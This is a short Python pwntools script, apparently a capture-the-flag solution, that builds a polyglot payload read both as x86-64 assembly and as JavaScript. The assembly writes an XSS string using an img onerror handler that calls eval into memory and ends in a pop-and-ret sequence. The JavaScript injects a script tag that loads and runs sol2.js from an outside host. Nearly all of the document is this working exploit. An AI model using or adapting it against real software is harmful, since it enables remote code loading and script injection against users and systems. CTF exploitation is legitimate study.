from pwn import *

context.arch = 'amd64'

my_files = 'http://itszn.com/636363b42573f220124b'

pl1 = 'eval(asm.value)\0'
pl1 = '{rax:`<img src=x onerror="eval(asm.value)"/>`}\0'

pl2 = '''(function(){let s = document.createElement('script');s.src=`''' + my_files + '''/sol2.js`;document.head.append(s);})()'''
#pl2 = 'console.log("pwn")'

sc = ';'+pl2

sc += ';/*\n'
for i in range(0, len(pl1), 8):
    sc += 'mov rax, 0x%x\n'%u64(pl1.ljust(len(pl1)+8, '\0')[i : i+8])
    sc += 'mov [r15+%u], rax\n'%i


sc += '''
pop r15
pop r15
pop r14
pop r13
pop r12
pop r11
pop r10
pop r9
pop r8
pop rdi
pop rsi
pop rbp
pop rbx
pop rdx
pop rcx
pop rax
pop rbp
ret
;*/
'''
print sc
